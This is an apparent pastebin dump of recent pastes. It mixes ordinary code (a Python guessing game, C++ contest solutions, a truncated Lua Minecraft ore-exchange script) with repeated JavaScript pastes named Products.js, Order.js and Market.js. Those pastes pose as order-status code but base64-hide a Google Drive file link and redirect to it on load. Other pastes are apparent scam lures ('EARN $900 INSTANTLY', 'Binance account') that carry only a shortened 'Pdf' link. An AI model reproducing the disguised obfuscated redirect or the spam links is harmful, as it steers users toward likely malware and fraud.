id,title,username,language,date,content
4s81mN1x,Binance account CW,AlexVidoCasanelli,JavaScript,Saturday 29th of March 2025 12:54:37 PM CDT," 
Pdf https://tinyurl.com/methodssss


VecdeXSijy
"
tprzWJgk,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:54:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/011/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dkqkfhsd,numberguesser,gruntfutuk,Python,Saturday 29th of March 2025 12:44:16 PM CDT,""""""" simple number guessing game for beginners showing some modularisation """"""""

from random import randint
import math
from dataclasses import dataclass

# some constants
LOWEST: int = 1
HIGHEST: int = 100

AFFIRMATION: frozenset[str] = frozenset({""yes"", ""y"", ""sure"", ""yep"", ""1"", ""ok"", ""yeh"", ""yup""})
REJECTION: frozenset[str] = frozenset({""no"", ""n"", ""nah"", ""nope"", ""0""})

@dataclass
class Params:
    correct: int
    lowest: int = LOWEST
    highest: int = HIGHEST
    attempts: int = HIGHEST - LOWEST + 1

def get_num(prompt: str = ""Enter a number: "", lowest: int = LOWEST, highest: int = HIGHEST) -> int:
    """""" prompts user for and returns valid integer within range specified """"""
    valid: bool = False
    while not valid:
        response: str = input(prompt)
        try:
            num: int = int(response)
            if not (lowest <= num <= highest):
                raise ValueError
        except ValueError:
            print(f""Not valid. Expected whole number between {lowest} and {highest}"")
        else:
            valid = True
    return num

def get_guess(lowest: int, highest: int, attempts: int) -> int:  # User gives their guess
    return get_num(
        f""\nYou have {attempts} attempts.\nEnter a number between {lowest} and {highest}: "",
        lowest,
        highest
    )

def set_range() -> tuple[int, int]:  # User sets range for random number generation
    while True:
        lowest: int = get_num(""Enter minimum number: "", LOWEST, int(HIGHEST / 1.5))
        highest: int = get_num(""Enter maximum number: "", lowest, HIGHEST)
        if lowest < highest:
            return lowest, highest
        else:
            print(""Maximum number must be greater than minimum number. Try again."")

def display_difficulty(levels: dict[str, tuple[str, float]]):  # Displays difficulty levels
    print(""\nDifficulty Levels:"")
    for level in levels:
        print(f""\t{level}: {levels[level][0]}"")

def set_difficulty(levels: dict[str, tuple[str, float]]) -> int:  # User decides difficulty
    valid: bool = False
    while not valid:
        display_difficulty(levels)
        try:
            choice: int = int(input(f""Select a difficulty level (1-{len(levels)}): ""))
            if 1 <= choice <= len(levels):
                choice_str = str(choice)
                valid = True
            else:
                print(f""Invalid Selection: Try Again. Please select a number between 1 and {len(levels)}."")
        except ValueError:
            print(f""Invalid Selection: Try Again. Please select a number between 1 and {len(levels)}."")
    factor: float = levels[choice_str][1]
    return math.ceil((HIGHEST - LOWEST + 1) * factor)

def startup() -> Params:
    """""" set and return game parameters with user input """"""
    print(""\n\n\nGuessing Number Game"")
    print(""*********************"")
    lowest, highest = set_range()
    correct = randint(lowest, highest)
    attempts: int = set_difficulty(levels)
    return Params(correct, lowest, highest, attempts)

def play(params: Params) -> None:  # Loops until player wins or loses
    """""" play guessing game until player uses up all attempts and loses or guesses correctly and wins """"""
    over: bool = False
    while not over and params.attempts > 0:
        user: int = get_guess(params.lowest, params.highest, params.attempts)
        params.attempts -= 1
        if user == params.correct:
            print(f""\nYou Win! You had {params.attempts} attempts left."")
            over = True
        elif user > params.correct:
            print(""Too High!"")
        else:  # has to be user < correct
            print(""Too Low!"")
    if not over:
        print(f""\nYou Lose! The number was {params.correct}."")

def main():
    """"""Main game loop.""""""
    play_game = True
    while play_game:
        params: Params = startup()
        play(params)
        valid_input = False
        while not valid_input:
            play_again = input(""Play again? (yes/no): "").lower()
            if play_again in AFFIRMATION:
                valid_input = True
            elif play_again in REJECTION:
                play_game = False
                valid_input = True
            else:
                print(""Invalid input. Please enter yes or no."")

levels = {
    ""1"": (""Easy"", 2),
    ""2"": (""Medium"", 1),
    ""3"": (""Hard"", 0.8),
    ""4"": (""Elite"", 0.5),
    ""5"": (""Master"", 0.4),
    ""6"": (""GrandMaster"", 0.05)
}

if __name__ == ""__main__"":
    main()
"
jWz5ksW8,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:39:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/829/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NRkcmmQ0,EARN $900 INSTANTLY 2025 BT,AlexVidoCasanelli,JavaScript,Saturday 29th of March 2025 12:38:42 PM CDT," 
Pdf https://tinyurl.com/methodssss


e1XOqEsfrx
"
qD6TwYir,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:23:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gT7Utxvu,Random Gmail Acc 1A,Hitgun_Kim,JavaScript,Saturday 29th of March 2025 12:22:11 PM CDT," 
Pdf https://tinyurl.com/methodssss


9fYkukpIYv
"
zgujskVb,Untitled,WassupDog45,JavaScript,Saturday 29th of March 2025 12:08:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/864/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xfqGa4Vp,Make $1000 15-MINUTES (BEGINNER) WM,Hitgun_Kim,JavaScript,Saturday 29th of March 2025 12:06:16 PM CDT," 
Pdf https://tinyurl.com/methodssss


hWqOvfwqUo
"
t0A594zB,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:53:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/711/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DP4GidVS,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:37:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/390/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NhQitCSt,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:22:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/470/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ybjdKyWA,Untitled,Josif_tepe,C++,Saturday 29th of March 2025 11:12:50 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;

pair<int, int> idx[maxn];
int dist(int i, int j, int ci, int cj) {
    return abs(j - cj) + abs(i - ci);
}
map<int, int> mapa;
vector<pair<int, int>> graph[maxn];
int main() {
    ios_base::sync_with_stdio(false);
    int r, c;
    cin >> r >> c;
    
    vector<vector<int>> mat(r, vector<int>(c));
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            
            idx[cnt] = make_pair(i, j);
            cnt++;
        }
    }
    int n = r * c;
    
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            graph[mat[i][j]].push_back(make_pair(mat[idx[mat[i][j]].first][idx[mat[i][j]].second], dist(i, j, idx[mat[i][j]].first, idx[mat[i][j]].second)));
        }
    }
    
    vector<bool> visited(n + 1);
    for(int i = 1; i <= n; i++) {
        if(!visited[i]) {
            
            visited[i] = true;
            queue<int> q;
            q.push(i);
            cout << i << "" "";
            ll sum = 0;
            while(!q.empty()) {
                int c = q.front();
                q.pop();
                
                
                for(int i = 0; i < (int) graph[c].size(); i++) {
                    int neighbour = graph[c][i].first;
                    int weight = graph[c][i].second;
                    
                    if(!visited[neighbour]) {
                        cout << weight << "" "" << neighbour << "" "";
                        visited[neighbour] = true;
                        q.push(neighbour);
                        
                        sum += weight;
                        mapa[neighbour] = sum;
                    }
                    
                    
                }
            }
            cout << endl;
        }
    }
    
    for(pair<int, int> m : mapa) {
        cout << m.first << "" "" << m.second << endl;
    }
    
    
    return 0;
    
}
"
WiHGmfBH,Untitled,WassupDog45,JavaScript,Saturday 29th of March 2025 11:06:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/133/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZuyrUSnm,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 10:51:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/936/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EhVg922G,Untitled,Josif_tepe,C++,Saturday 29th of March 2025 10:37:18 AM CDT,"#include <iostream>
#include <vector>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;

pair<int, int> idx[maxn];
int dist(int i, int j, int ci, int cj) {
    return abs(j - cj) + abs(i - ci);
}
int main() {
    ios_base::sync_with_stdio(false);
    int r, c;
    cin >> r >> c;
    
    vector<vector<int>> mat(r, vector<int>(c));
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            
            idx[cnt] = make_pair(i, j);
            cnt++;
        }
    }
    ll res = 0;
    cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            if(cnt != mat[i][j]) {
                int tmp = cnt;
                pair<int, int> c = make_pair(i, j);
                while(mat[c.first][c.second] != cnt) {
                    res += dist(c.first, c.second, idx[mat[c.first][c.second]].first, idx[mat[c.first][c.second]].second);
                    c = idx[mat[c.first][c.second]];
                }
                
            }
            cnt++;
        }
    }
    cout << res << endl;
    
    
    return 0;
    
}
"
k61PGw8T,艺术与篮球 参考代码,Dmaxiya,C++,Saturday 29th of March 2025 10:32:29 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
int ans;
int days[13] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
int bihua[10] = {13, 1, 2, 3, 5, 4, 4, 2, 2, 2};

int cal(int x, int dig) {
    int ret = 0;
    for (int i = 0; i < dig; ++i) {
        ret += bihua[x % 10];
        x /= 10;
    }
    return ret;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int year = 2000; year <= 2024; ++year) {
        if (year % 400 == 0 || (year % 4 == 0 && year % 100 != 0)) {
            days[2] = 29;
        } else {
            days[2] = 28;
        }
        int maxMonth = (year == 2024 ? 4 : 12);
        for (int month = 1; month <= maxMonth; ++month) {
            int maxDay = (year == 2024 && month == 4 ? 13 : days[month]);
            for (int day = 1; day <= maxDay; ++day) {
                if (cal(year, 4) + cal(month, 2) + cal(day, 2) > 50) {
                    ++ans;
                }
            }
        }
    }
    cout << ans << endl;

    return 0;
}"
TLzZj3N2,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 10:20:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/541/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0N9gfHFc,Untitled,GekaYamix,Lua,Saturday 29th of March 2025 10:08:17 AM CDT,"-- Определение списка руд с их параметрами
local items = { -- множитель, название руды, забираем руду, dmg, отдаём слиток, dmg, название слитка, ore_dictionary
  {""3"",""Дракониевая руда"",""DraconicEvolution:draconiumOre"",""0"",""DraconicEvolution:draconiumDust"",""0"",""Дракониевая пыль"",""dustDraconium""},
  {""2"",""Алмазная руда"",""minecraft:diamond_ore"",""0"",""minecraft:diamond"",""0"",""Алмаз"",""gemDiamond""},
  {""2"",""Изумрудная руда"",""minecraft:emerald_ore"",""0"",""minecraft:emerald"",""0"",""Изумруд"",""gemEmerald""},
  {""2"",""Золотая руда"",""minecraft:gold_ore"",""0"",""minecraft:gold_ingot"",""0"",""Золотой слиток"",""ingotGold""},
  {""2"",""Железная руда"",""minecraft:iron_ore"",""0"",""minecraft:iron_ingot"",""0"",""Железный слиток"",""ingotIron""},
  {""2"",""IC2 Медная руда"",""IC2:blockOreCopper"",""0"",""IC2:itemIngot"",""0"",""Медный слиток"",""ingotCopper""},
  {""2"",""IC2 Оловянная руда"",""IC2:blockOreTin"",""0"",""IC2:itemIngot"",""1"",""Оловянный слиток"",""ingotTin""},
  {""2"",""IC2 Свинцовая руда"",""IC2:blockOreLead"",""0"",""IC2:itemIngot"",""5"",""Свинцовый слиток"",""ingotLead""},
  {""2"",""TE Медная руда"",""ThermalFoundation:Ore"",""0"",""ThermalFoundation:material"",""64"",""Медный слиток"",""ingotCopper""},
  {""2"",""TE Оловянная руда"",""ThermalFoundation:Ore"",""1"",""ThermalFoundation:material"",""65"",""Оловянный слиток"",""ingotTin""},
  {""2"",""TE Никелевая руда"",""ThermalFoundation:Ore"",""4"",""ThermalFoundation:material"",""68"",""Никелевый слиток"",""ingotNickel""},
  {""2"",""TE Серебряная руда"",""ThermalFoundation:Ore"",""2"",""ThermalFoundation:material"",""66"",""Серебряный слиток"",""ingotSilver""},
  {""2"",""TE Платиновая руда"",""ThermalFoundation:Ore"",""5"",""ThermalFoundation:material"",""69"",""Платиновый слиток"",""ingotPlatinum""},
  {""2"",""Руда истинного кварца"",""appliedenergistics2:tile.OreQuartz"",""0"",""appliedenergistics2:item.ItemMultiMaterial"",""0"",""Истинный кварц"",""crystalCertusQuartz""},
  {""3"",""Кварцевая руда"",""minecraft:quartz_ore"",""0"",""minecraft:quartz"",""0"",""Кварц"",""gemQuartz""},
  {""8"",""Лазуритовая руда"",""minecraft:lapis_ore"",""0"",""minecraft:dye"",""4"",""Лазурит"",""dye""},
  {""8"",""Красная руда"",""minecraft:redstone_ore"",""0"",""minecraft:redstone"",""0"",""Красная пыль"",""dustRedstone""},
  {""2"",""Угольная руда"",""minecraft:coal_ore"",""0"",""minecraft:coal"",""0"",""Уголь"",""coal""}
}

-- Подключение необходимых библиотек
local unicode = require(""unicode"")
local com = require(""component"")
local event = require(""event"")
local interface = com.isAvailable(""me_interface"") and com.me_interface or error(""нет ме интерфейса"")
local db = com.isAvailable(""database"") and com.database or error(""нет базы данных"")
local chest = com.isAvailable(""chest"") and com.chest or error(""нет сундука"")
local size = chest.getInventorySize()
local gpu = com.gpu
local w, h = gpu.getResolution()
local net_count,line_count = 0,0
local last_update_time = os.time() -- Время последнего обновления
local cached_network = nil -- Кэшированные данные о ресурсах

-- Функция для склонения слов в зависимости от числа
local function declension(number)
  local dec = """"
  local rest = number % 10
  local str = string.sub(number,string.len(number)-1)
  if str == ""11"" or str == ""12"" or str == ""13"" or str == ""14"" then
    dec = "" слитков""
  elseif rest == 1 then
    dec = "" слиток""
  elseif rest == 2 or rest == 3 or rest == 4 then
    dec = "" слитка""
  else
    dec = "" слитков""
  end
  return number..dec
end

-- Функция для центрирования текста на экране
local function center(coord,text,color)
  gpu.setForeground(color)
  local text_len = unicode.len(text)
  local start_pos = math.floor((w - text_len) / 2)
  gpu.set(start_pos, coord, text)
end

-- Функция для вывода цветного текста на экран
local function color_text(w,line,text,color)
  gpu.setForeground(color)
  gpu.set(w,line,text)
end

-- Функция для вывода информации о доступных ресурсах
local function print_items()
  local line,size,fill = 3,0,true
  local network = cached_network or interface.getItemsInNetwork()

  if #network ~= net_count then
    if fill then
      gpu.fill(1,3,w,h-4,"" "") -- Очистка экрана перед выводом информации, оставляя место для заголовка и кнопок
      fill = not fill
    end
  end

  gpu.fill(1,1,w,1,"" "") -- Очистка первой строки
  center(1, ""Доступные ресурсы"", 0x99CCFF) -- Заголовок
  color_text(3, 2, string.rep(""─"", 76), 0x009999) -- Разделительная линия

  for ind = 1,#items do
    for net = 1,#network do
      if network[net].name == items[ind][5] then
        if network[net].damage == tonumber(items[ind][6]) then
          if network[net].size >= tonumber(items[ind][1]) then
            if #network ~= net_count then
              if fill then
                fill = not fill
              end
              color_text(5,line,items[ind][2],0xFF9900) -- Вывод названия руды
              color_text(28,line,""1"",0x3399FF) -- Вывод количества руды
              color_text(30,line,""-->"",0xFF0000) -- Вывод стрелки
              color_text(34,line,""X ""..items[ind][1],0x3399FF) -- Вывод множителя
              color_text(42,line,items[ind][7],0xFF9900) -- Вывод названия слитка
              color_text(63,line,""доступно"",FF9900) -- Вывод текста ""доступно""
              color_text(73,line,tostring(network[net].size),0x3399FF) -- Вывод количества доступных слитков
              --color_text(3,line+1,string.rep(""─"",76),0xFFFFFF) -- Вывод разделительной линии
              size = size + network[net].size -- Увеличение общего количества доступных слитков
            else
              size = size + network[net].size -- Увеличение общего количества доступных слитков
              color_text(73,line,tostring(network[net].size..""   ""),0x3399FF) -- Вывод количества доступных слитков с пробелами
            end
            line = line + 2 -- Переход на следующую строку
          end
        end
      end
    end
  end
  net_count = #network
  if line == 3 or line ~= line_count then
    net_count = 0
  end
  line_count = line
  if size > 0 then
    center(line_count+2,""Обмен ресурсов. Всего доступно ""..declension(size),0x00CCFF) -- Вывод общего количества доступных слитков
  else
    center(h/2,""Обменник ресурсов пустой"",0xFF0000) -- Вывод сообщения, если нет доступных ресурсов
  end
end

-- Функция для отправки предметов в сеть
local function pushItem(name,count,label)
  db.clear(1)
  interface.store(name,db.address,1)
  interface.setInterfaceConfiguration(1,db.address,1,64)
  local drop = 0
  while true do
    if drop == count then
      interface.setInterfaceConfiguration(1,db.address,1,0)
      net_count = 0
      break
    else
      local dropcount = interface.pushItem(""UP"",1,count-drop)
      drop = drop + dropcount
      if dropcount == 0 then
        center(h/2,""освободите место в сундуке"",0xFF0000) -- Вывод сообщения о необходимости освободить место в сундуке
        center(h/2+2,""Ожидаю выдать ""..label,0xFFFFFF) -- Вывод ожидания выдачи предмета
        center(h/2+4,""всего ""..count-drop,0xFFFFFF) -- Вывод общего количества предметов для выдачи
        os.sleep(1)
      end
    end
  end
end

-- Функция для обмена руды на слитки
local function exchange_ore_dict()
  local ore_dict,item_count = """",false
  local data = chest.getAllStacks(0)
  for slot = 1,size do
    if data[slot] then
      for ind = 1,#items do
        if data[slot].id == items[ind][3] then
          if data[slot].dmg == tonumber(items[ind][4]) then
            ore_dict = items[ind][8]
            break
          end
        end
      end
      local network = cached_network or interface.getItemsInNetwork()
      for ind2 = 1,#items do
        if ore_dict == items[ind2][8] then
          local ore = items[ind2][5]
          local dmg = items[ind2][6]
          local ore_name = items[ind2][2]
          for net = 1,#network do
            if network[net].name == ore then
              if network[net].damage == tonumber(dmg) then
                if network[net].size >= tonumber(items[ind2][1]) then
                  item_count = chest.pushItem(""DOWN"",slot,(network[net].size/items[ind2][1]))
                  local drop_count = item_count*items[ind2][1]
                  local ingot_name = items[ind2][7]
                  center(1,""Меняю  ""..item_count..""  ""..ore_name..""  на  ""..drop_count..""  ""..ingot_name,0xFFFFFF) -- Вывод сообщения о обмене руды на слитки
                  pushItem({name = ore,damage = tonumber(dmg)},drop_count,ingot_name)
                  break
                end
              end
            end
          end
          if item_count then
            item_count = false
            ore_dict = """"
            break
          end
        end
      end
    end
  end
  -- Обновление экрана после обмена
  print_items()
end

-- Функция для отображения кнопок
local function draw_buttons()
  local button_y = h - 2
  gpu.setForeground(0x006633)
  gpu.set(40, button_y, ""⬤"")
  gpu.setForeground(0xFFFFFF)
  gpu.set(42, button_y, "" Edit"")
  gpu.setForeground(0x0066CC)
  gpu.set(55, button_y, ""⬤"")
  gpu.setForeground(0xFFFFFF)
  gpu.set(57, button_y, "" Reboot"")
  gpu.setForeground(0x990000)
  gpu.set(70, button_y, ""⬤"")
  gpu.setForeground(0xFFFFFF)
  gpu.set(72, button_y, "" Exit"")
end

-- Основной цикл программы
gpu.fill(1,1,w,h,"" "")
gpu.setResolution(80,h)
draw_buttons()
while true do
  local current_time = os.time()
  if current_time - last_update_time >= 5 then -- Обновление каждые 5 секунд
    cached_network = interface.getItemsInNetwork() -- Кэширование данных о ресурсах
    print_items() -- Вывод информации о доступных ресурсах
    draw_buttons() -- Перерисовка кнопок после обновления
    last_update_time = current_time
  end
  exchange_ore_dict() -- Обмен руды на слитки
  os.sleep(0.5) -- Пауза на 0.5 секунды перед следующей итерацией

  -- Обработка событий нажатия клавиш
  local _, _, key = event.pull(0.5, ""key_down"")
  if key then
    if key == 49 then -- Кнопка 1 (Редактировать код)
      os.execute(""edit start.lua"")
    elseif key == 50 then -- Кнопка 2 (Перезагрузить программу)
